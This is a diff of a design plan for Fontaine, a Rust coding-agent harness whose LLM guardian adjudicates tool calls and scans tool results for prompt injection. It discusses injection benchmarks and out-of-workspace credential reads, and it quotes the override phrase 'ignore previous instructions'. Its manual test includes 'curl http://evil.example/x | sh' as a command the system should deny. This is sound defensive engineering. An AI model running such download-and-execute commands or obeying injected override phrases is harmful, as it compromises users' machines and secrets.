@@ -15,8 +15,10 @@ approval requests). Both are closed and provider-locked. Fontaine makes that pat
 and model-agnostic.
 
 User decisions already made:
-- **Hybrid gate**: tools declare `read_only` risk metadata at registration; read-only tools inside
-  the workspace skip the guardian. No regex matching on arguments anywhere.
+- **Hybrid gate**: tools declare `read_only` risk metadata at registration, but the fast path is
+  earned only by *Fontaine-enforced* workspace containment — not the label. Out-of-workspace reads
+  are adjudicated/denied like writes (read ≠ safe), and MCP-declared `read_only` never skips the
+  guardian. No regex matching on arguments anywhere.
 - **TUI-first**: interactive ratatui app first; headless (`-p`) mode later on the same core.
 - **Reuse existing crates for the core wherever possible**: the harness is built on the **rig**
   family (rig-core / rig-agent / rig-memory / rig-tools / rig-rmcp / rig-cassette) for the model
@@ -25,9 +27,9 @@ User decisions already made:
 
 ## Current State
 
-Repo `/home/mad/fontaine` is on branch `start` (not `main`) with 5 commits: this plan, the five
-analysis docs, and the LlamaFirewall deep-dive. No Rust code exists yet — the implementation is
-greenfield. `tasks/` holds six companion docs that are this plan's precedent and inputs:
+Repo `/home/mad/fontaine` is on branch `start` (not `main`); its history so far is this plan, the
+five analysis docs, the LlamaFirewall deep-dive, and review/fact-check passes on this branch. No
+Rust code exists yet — the implementation is greenfield. `tasks/` holds six companion docs that are this plan's precedent and inputs:
 `analysis-01-competitive-landscape.md` (market/permission-story survey),
 `analysis-02-guardian-market.md`, `analysis-03-differentiation.md`,
 `analysis-04-devils-advocate.md` (kill criteria), `analysis-05-strategic-verdict.md` (verdict and
@@ -100,7 +102,7 @@ From the official docs (code.claude.com/docs/en/permission-modes and /auto-mode-
 
 - Rust workspace, 15+ LLM providers behind its own provider trait (not a third-party framework),
   MCP extensions via the Rust SDK, `reqwest` + `rustls`, `goosed` server + CLI + desktop surfaces.
-- Confirms: the older production harnesses (codex-rs, goose, claude-code-rs) each hand-rolled a
+- Confirms: the older production harnesses (codex-rs, goose) each hand-rolled a
   thin provider layer over `reqwest` — but they predate rig's 0.4x decomposition into harness-grade
   crates (agent runtime with hooks, memory/compaction, coding tools, MCP bridge, cassette replay).
   Fontaine reuses rig for that layer instead of hand-rolling it (see Trade-offs); goose remains the
@@ -118,7 +120,8 @@ From the official docs (code.claude.com/docs/en/permission-modes and /auto-mode-
   results), so it must have **no tools of its own**, must emit **structured output only** (a fixed
   verdict schema can't carry an injection forward), and its verdicts are validated by the
   controller (regular code) before acting.
-- **AgentDojo** (Liu, Yu, Li, Li; arXiv:2406.18649, ICLR 2025) and follow-ups: prompt-injection detectors transfer poorly between
+- **AgentDojo** (Debenedetti, Zhang, Balunović, Beurer-Kellner, Fischer & Tramèr, ETH Zürich;
+  arXiv:2406.13352, NeurIPS 2024 Datasets & Benchmarks) and follow-ups: prompt-injection detectors transfer poorly between
   benchmarks; specialized small detectors (e.g. Prompt Guard 2) catch ~0–2% of realistic agent
   injections. Conclusion: a **general reasoning model as guardian with task context** is currently
   the strongest practical approach — and the guardian itself must be treated as an attack surface
@@ -134,12 +137,10 @@ From the official docs (code.claude.com/docs/en/permission-modes and /auto-mode-
   PromptGuard 2 (injection classifier), AlignmentCheck (LLM chain-of-thought auditor), CodeShield
   (static analysis), regex/custom scanners. It is the strongest open prior art and the benchmark
   baseline we will be compared against — but it is a *detector library for agent builders*, not a
-  *permission engine inside a harness*. Commit activity through 2026 is bot chores only
-  (`research-llamafirewall.md` §6) — though Meta has **not** declared the project in maintenance
-  mode (no such blog statement exists); the "end-of-line" facts are narrower: PromptGuard 2 is the
-  final generation of the Llama Guard line (HF model card: "The final version of PromptGuard 2 will
-  not be updated further"; LlamaGuard4.md: no successor), the repos remain public and responsive,
-  and no successor is announced — treat classifier updates as slow-moving.
+  *permission engine inside a harness*. Commit activity since ~March 2026 is predominantly bot
+  chores (`research-llamafirewall.md` §6 — last functional change Jan 2026, last commit 2026-08-18);
+  Meta has **not** declared the project in maintenance mode (no such statement exists) — the
+  slow-moving read on classifier updates rests on that commit history, not a Meta declaration.
 - **Monitoring vs authorization**: AlignmentCheck answers "has this agent drifted from the user's
   goal?" — a trace **drift monitor** (labeled experimental; defaults to a Together-hosted model).
   Fontaine's guardian answers "may this specific action run, under these rules, in this
@@ -149,22 +150,26 @@ From the official docs (code.claude.com/docs/en/permission-modes and /auto-mode-
 - **AgentDojo baseline for our eval**: report Fontaine guardian results in AgentDojo-comparable
   terms (ASR × utility) against their published numbers — no-defense .176 / PromptGuard 2 .075 /
   AlignmentCheck .029 / combined .0175 — as the bar to beat. These are the LlamaFirewall paper's
-  own runs; the AgentDojo paper itself (arXiv:2406.18649, ICLR 2025) never mentions LlamaFirewall
+  own runs; the AgentDojo paper itself (arXiv:2406.13352, NeurIPS 2024) never mentions LlamaFirewall
   or AlignmentCheck, and its published table is **task-completion under attack** — defense
   effectiveness = benign success minus attack success.
-- **PromptGuard 2 as the tool-result scanner**: adopt as the default for the result-scanning slot
-  (recall @ 1% FPR **0.971 EN / 0.956 multilingual** per the HF model card — language-dependent;
-  the widely-quoted "97.5%" is third-party rounding; 19–92ms) via ONNX Runtime (`ort` crate) or a
-  sidecar, instead of a hand-rolled cheap-model pass. Caveat: PromptGuard 2 weights carry the
-  **Llama Community License** (non-commercial terms; license + use-policy + "Built with Llama"
-  notice; no gated approval today) — Llama Guard 4 is the Apache-2.0 model but 12B is too heavy
-  for hot-path scanning. The air-gapped story is "bring your own scanner model; PromptGuard 2
-  supported if licensed."
+- **PromptGuard 2 as the tool-result scanner** (default — user decision 2026-10-21): adopt as the
+  default for the result-scanning slot (recall @ 1% FPR **97.5% (English)** per the HF model card
+  and the paper's §4.1 table; AUC 0.98 EN / 0.995 multilingual; 19–92ms) via ONNX Runtime
+  (`ort` crate), with the cheap-LLM pass as the fallback / bring-your-own option. Caveat: the
+  PromptGuard 2 HF repos are **gated downloads** (`gated: "manual"` — license acceptance required)
+  and the weights carry the **Llama 4 Community License**, which **permits commercial use**
+  (royalty-free, conditional; extra restrictions only above 700M monthly active users; AUP +
+  "Built with Llama" notice). Llama Guard 4 12B is under the same license (not Apache-2.0) and
+  too heavy for hot-path scanning anyway. Community mirrors and ONNX ports exist but do not
+  change the license; the air-gapped / license-clean story is the BYO-scanner interface.
 - **Attribution**: the LlamaFirewall code is MIT-licensed (its `Examples/` dir is CC-BY-NC-4.0;
   the enclosing PurpleLlama repo is CC-BY-NC-4.0); their AlignmentCheck prompts (paper Appendix
-  C.6, CC BY 4.0) are reusable, attributed prior art for `guardian_prompt.md`. Cite their §2.4
+  C.6, CC BY 4.0) are reusable, attributed prior art for `guardian_prompt.md`. Cite their
   anti-proprietary-guardrails argument — provider-embedded safety offers "limited visibility,
-  auditability, and customizability" — it is our pitch, from Meta. Do **not** take a runtime
+  auditability, and customizability" (the paper's Introduction §1; §2.4, "Open-Source vs.
+  Proprietary Approaches", says "limited visibility and extensibility") — it is our pitch, from
+  Meta. Do **not** take a runtime
   dependency on the `llamafirewall` Python package; depend on its models and numbers, not its
   framework.
 
@@ -248,6 +253,8 @@ entirely.
            2. mode == plan?  → block state-changing tools outright
            3. mode == bypass → Allow (no checks; opt-in flag only)
            4. RiskClass::ReadOnly && args within workspace scope? → Allow (no guardian)
+              (scope check enforced by Fontaine's wrapper/scope validator, first-party only;
+               MCP-declared read_only does not qualify — such tools register as Arbitrary)
            5. mode == manual/acceptEdits → human prompt (acceptEdits: auto-allow edits in workdir)
            6. mode == auto → Guardian::adjudicate(request) ──▶ Verdict
            7. mode == dontAsk → anything not pre-allowed is Denied
@@ -267,9 +274,18 @@ model.
 ### The guardian agent (fontaine-guardian)
 
 A **separate, tool-less LLM conversation** — one stateless request per adjudication (no growing
-guardian context to poison). Runs on a **separately configured model** (`guardian.model`), default:
-the fastest model available on the main provider; must be independently settable (cheap model for
-cost, strong model for paranoia, local Ollama model for air-gapped judgment).
+guardian context to poison). Runs on a **separately configured model** (`guardian.model`).
+Fontaine ships an **ordered, benchmark-validated list of guardian models**, built from Fontaine's
+own evals (guardrail accuracy on the golden dataset, latency, robustness to evasion) and
+re-benchmarked each release; the default guardian is the **highest-ranked validated model
+available on the user's configured provider**. Seed examples for the list — cheap flash-tier
+models typical of subscription catalogs, model-agnostic: Claude Haiku 5.5, GPT-6 Luna, DeepSeek
+V4.1 Flash, GLM-5.3 Flash, Qwen3.8 Flash class. Changing the guardian model must be **easy but
+never automatic**: explicit `guardian.model` config or a `/guardian-model` command; if a pinned
+guardian model is unavailable, Fontaine **fails loudly and asks** — no silent substitution. For
+providers with no catalog match (custom openai-compatible endpoints / Ollama): only models
+explicitly set via `guardian.model` are used; if unset, fall back to the main model with a
+one-time notice.
 
 **Adjudication request** (what the guardian sees — mirrors Claude Code's classifier inputs):
 
@@ -324,7 +340,8 @@ wrapped in delimited untrusted blocks.
   five times) adjudicate once; the cache key includes the rules/env version so config edits
   invalidate it.
 - guardian runs concurrently with nothing else pending (it is on the critical path); mitigate with
-  a fast default guardian model and by skipping read-only tools entirely.
+  a fast default guardian model and by skipping only the Fontaine-validated in-workspace read-only
+  fast-path calls (out-of-scope reads and MCP tools are never skipped).
 - when the agent emits multiple tool calls in one turn, adjudicate them in parallel; execute only
   those allowed, in order; a Deny in a batch does not poison the others (each gets its own
   tool_result).
@@ -332,8 +349,11 @@ wrapped in delimited untrusted blocks.
 **Result scanning (phase 2 of guardian)**: like Claude Code's server-side probe, a scanner pass
 over incoming tool *results* that flags injection-looking content
 ("ignore previous instructions…", credential-shaped strings) and annotates the result before the
-main agent reads it. Default scanner: PromptGuard 2 (per the LlamaFirewall findings); a cheap-LLM
-pass is the fallback. Off by default for latency; configurable.
+main agent reads it. Default scanner: **PromptGuard 2 86M via ONNX (`ort` crate)** (per the
+LlamaFirewall findings — user decision 2026-10-21); the cheap-LLM pass is the fallback / BYO
+option. PromptGuard 2's HF downloads are gated and Llama 4 Community License-encumbered — that
+caveat is surfaced at first enable; a BYO-scanner interface serves license-clean setups. Off by
+default for latency; configurable.
 
 ### Tools: rig-tools + a risk-metadata registry + GuardedTool wrapper (fontaine-tools)
 
@@ -350,7 +370,15 @@ Reuse rather than rewrite. Fontaine does **not** define its own `Tool` trait —
   registration (rig's registry supports ordered registrations). This is the deterministic,
   non-LLM half of the hybrid gate: `ReadOnly` + args validated within workspace scope (a
   `fontaine-tools` scope/symlink validator, deterministic code — not regex-on-args) ⇒ pipeline
-  auto-allows without a guardian call.
+  auto-allows without a guardian call. Two clarifications: **read ≠ safe** — a read outside the
+  workspace (`~/.ssh/*`, cloud credential files, `.env`, browser cookie stores, metadata endpoints)
+  is a classic recon/exfiltration step, so containment inside the workspace is what earns the fast
+  path, never the read-only label; and **declaration ≠ authorization** — risk metadata from
+  third-party (MCP) servers is untrusted input (a malicious server will happily label a
+  write/network-capable tool `read_only`), so the fast path applies only where *Fontaine itself*
+  enforces containment at the execution boundary (built-in tools and wrapped paths validated by the
+  scope checker). MCP tools default to full adjudication; their declared `read_only` is an
+  optimization hint for first-party tools, not an authorization token.
 - **GuardedTool**: a decorator implementing `rig_core::tool::Tool` that wraps any inner tool and,
   in its `call`, runs the `PermissionPipeline` (mode check → read-only fast path → guardian in
   `auto`) before delegating to the inner tool. This is the **single choke point**: every tool — rig
@@ -392,7 +420,7 @@ model = "claude-sonnet-4-6"
 base_url = ""                     # for openai-compatible: OpenRouter/Ollama/LM Studio URL
 
 [guardian]
-model = "claude-haiku-5-5"        # optional; defaults to a fast model on the main provider
+model = "claude-haiku-5-5"        # optional; unset ⇒ top-ranked validated guardian model available on this provider (see The guardian agent)
 timeout_secs = 30
 confidence_threshold = 0.7
 cache = true
@@ -424,7 +452,7 @@ calls), input box, status bar showing mode (`⏵⏵ auto mode on`). Approval pro
 manual/escalate (allow once / allow session / deny + feedback). **Denial UX**: denials render
 inline with `[Rule]` + explanation; `/denied` command opens the Recently-denied list where `r`
 marks actions for retry (sends "you may retry" back to the agent) — Claude Code's exact flow.
-`/permissions` edits rules; `/model` and `/guardian` switch models live; Shift+Tab cycles modes.
+`/permissions` edits rules; `/model` and `/guardian-model` switch models live; Shift+Tab cycles modes.
 
 ## Implementation Steps
 
@@ -468,11 +496,13 @@ marks actions for retry (sends "you may retry" back to the agent) — Claude Cod
 9. Wire `auto` mode into the pipeline; denial reason → tool_result; denial records; parallel
    adjudication of batched tool calls.
 10. TUI denial UX: inline denial rendering, `/denied` retry list, `/permissions` rule editor,
-    `/guardian` model switch, low-confidence escalation prompts.
+    `/guardian-model` switch, low-confidence escalation prompts.
 11. Run the Phase-0 eval harness against live guardian models and **publish the guardian
     scorecard** with the release: catch rate per attack class × false-deny rate on benign commands
     × per-model results, reported in AgentDojo-comparable terms (ASR × utility) against the
-    LlamaFirewall baseline (see Research Findings). The guardian never ships un-scored — a bypass
+    LlamaFirewall baseline (see Research Findings); the same harness validates and **ranks the
+    guardian candidates for the default-guardian list** (guardrail accuracy on the golden dataset
+    × latency × robustness to evasion). The guardian never ships un-scored — a bypass
     found by Fontaine's own public eval is a credibility event; the same bypass found externally is
     the kill event (analysis-05 amendment A1, mitigating KILL #3).
 
@@ -483,11 +513,19 @@ marks actions for retry (sends "you may retry" back to the agent) — Claude Cod
 13. Session persistence via rig's serializable `AgentRun` + `rig-memory` save/resume (JSONL on
     disk, our own transcript log alongside); headless `fontaine -p "task"` on the same core
     (denials in headless auto = guardian only; in manual = denied, matching Claude Code).
+- Roadmap slot (analysis-05 amendments A3–A4, folded into the plan per user decision 2026-10-21):
+  a **sandbox-interop spike + `docs/sandboxing.md`** integration path for running Fontaine under
+  Anthropic's open-source `@anthropic-ai/sandbox-runtime` (srt) / bubblewrap — complements, does
+  not replace, the guardian (sandbox = blast radius, guardian = intent). And keep
+  `fontaine-guardian` **dependency-light and lift-out-able** as an embeddable crate, so other
+  harnesses can embed the adjudicator via adapters (see the rig contingency in Decisions).
 
 **Phase 6 — guardian hardening**
-14. Tool-result injection scanner: default scanner is **PromptGuard 2** (per
-    `research-llamafirewall.md` §7.2 — ONNX Runtime via the `ort` crate or a sidecar, with the
-    cheap-LLM pass as fallback), off by default, configurable. Evals are already public as of
+14. Tool-result injection scanner: default scanner is **PromptGuard 2 86M via ONNX (`ort`
+    crate)** (per `research-llamafirewall.md` §7.2; user decision 2026-10-21 — a sidecar process
+    and the cheap-LLM pass are the fallback / BYO options), off by default, configurable. Surface
+    the gated-download / Llama 4 Community License caveat at first enable; expose a BYO-scanner
+    interface for license-clean setups. Evals are already public as of
     Phase 4; nothing new lands in this phase.
 
 ## Files to Modify
@@ -537,7 +575,10 @@ No `fontaine-llm` crate — the model layer is rig.
   recovered by passing `prior_denials` explicitly.
 - **Read-only fast path (user-approved hybrid)** — skips guardian latency on the highest-frequency
   calls (Claude Code does the same). The scope check (workspace containment, symlink resolution) is
-  deterministic code, not regex-on-args; a read that escapes scope goes to the guardian.
+  deterministic code enforced by Fontaine at the execution boundary, not regex-on-args and not the
+  tool's own declaration; a read that escapes scope goes to the guardian (read ≠ safe —
+  out-of-workspace reads are recon/exfiltration risk), and MCP tools' self-declared `read_only`
+  never qualifies for the fast path.
 - **Prose rule lists over Rego/OPA-style policy** — prose matches the guardian's medium (it is an
   LLM), is what Claude Code proved works, and stays editable by humans; a deterministic policy
   engine can't express "unless the user specifically asked for it".
@@ -546,10 +587,31 @@ No `fontaine-llm` crate — the model layer is rig.
   on every tool-capable model including local ones (the "any model I like" requirement applies to
   the guardian too). We reuse it instead of hand-rolling either path.
 
+## Risk Gates (pre-committed kill criteria)
+
+Abandon or pivot fontaine-the-harness (keeping fontaine-guardian-the-library) if any of the
+following fires — transcribed from `analysis-05-strategic-verdict.md` ("Kill criteria"), which
+carries the reasoning:
+
+- OpenCode, Goose, or the claw-code lineage's active successors (LazyCodex / Gajae-Code) ship a
+  first-party LLM-guardian permission backend **with published evals** before Fontaine's eval
+  harness is public.
+- A public red-team bypass of Fontaine's guardian cannot be closed within one release cycle
+  (analysis-04 KILL #3 — mitigated by the eval-first sequencing already built into Phase 0/4).
+- rig adopts a permission-adjudication API and refuses upstream collaboration (KILL #8 becomes
+  fatal rather than convertible).
+- Eval results show the best local guardian models cannot clear a credible bar (e.g. <60% catch
+  on the seeded attack classes at <10% benign false-deny) — meaning the "any model" promise is
+  hollow for the feature that matters.
+
 ## Decisions
 
 - 2026-10-20: Hybrid gate — tool-declared `read_only` + workspace-scope check skips the guardian;
   everything else is adjudicated. (User choice.)
+- 2026-10-21: Hybrid-gate refinement — read/write is not a security classification: the fast path
+  requires *Fontaine-enforced* workspace containment, not the tool's label. Read-only ≠ safe
+  (out-of-scope reads are adjudicated/denied like writes), and third-party/MCP self-declared
+  `read_only` never earns the fast path. (User choice.)
 - 2026-10-20: TUI-first (ratatui), headless `-p` mode in Phase 5 on the same core. (User choice.)
 - 2026-10-20: Guardian is fail-closed on every non-verdict outcome (error, timeout, unparseable
   output, low confidence on destructive class). Adopted from Claude Code's documented behavior.
@@ -567,6 +629,20 @@ No `fontaine-llm` crate — the model layer is rig.
   classifier reviews agent-team messages the same way).
 - 2026-10-20: License is Apache-2.0 — the repo's `LICENSE` is verbatim Apache-2.0 text; rule prose
   adapted from Anthropic's published documentation gets an attribution note in docs/guardian.md.
+- 2026-10-21: "fontaine" is the final product name — binary, crate prefix, config dir
+  `~/.config/fontaine`, `FONTAINE.md` convention. (User decision; resolves former Open Question 1.)
+- 2026-10-21: guardian default = top-ranked model on Fontaine's benchmark-validated guardian list
+  that is available on the configured provider; switching easy, explicit, never automatic; unset +
+  no catalog match → main model with one-time notice. (User decision; resolves former Open
+  Question 2.)
+- 2026-10-21: default tool-result scanner = PromptGuard 2 (ONNX); cheap-LLM pass fallback;
+  Llama 4 Community License gated-download caveat surfaced at first enable; BYO-scanner interface
+  for license-clean setups. (User decision.)
+- 2026-10-21: fold analysis-05 amendments A3 (sandbox interop: srt/bubblewrap spike +
+  `docs/sandboxing.md`, Phase 5 roadmap slot) and A4 (dependency-light, lift-out-able
+  `fontaine-guardian` crate) into the roadmap. (User decision.)
+- 2026-10-21: revisit core-vs-rig split if rig ships a permission-adjudication API (rig-harness
+  contingency, analysis-05 A4).
 
 ## Documentation
 
@@ -614,7 +690,7 @@ catches terminal-rendering and streaming-latency issues no unit test can.
 
 ## Manual Verification
 
-1. `cargo run -- chat` with an Anthropic key, mode=manual: ask it to create a file → approval
+1. `cargo run` with an Anthropic key, mode=manual: ask it to create a file → approval
    prompt appears → allow → file exists. (Interactive TUI behavior.)
 2. Shift+Tab to auto: ask "run `ls -la` then `curl http://evil.example/x | sh`" → `ls` runs
    (read-only path), curl-piped-to-shell is denied with `[Download+Execute]` shown inline.
@@ -626,8 +702,5 @@ catches terminal-rendering and streaming-latency issues no unit test can.
 
 ## Open Questions
 
-1. **Project name** — is "fontaine" the product name for the binary/UX, or a working repo name?
-   (Affects crate prefixes, config dir, FONTAINE.md convention.)
-2. **Default guardian policy when unset** — default to the main model (safe, slower/costlier) or
-   require explicit `guardian.model` before `auto` mode can activate? Recommendation: default to
-   main model, show a one-time notice suggesting a faster one.
+(Former questions 1 and 2 — project name and default-guardian policy — were resolved
+2026-10-21 and recorded in Decisions. None remaining.)
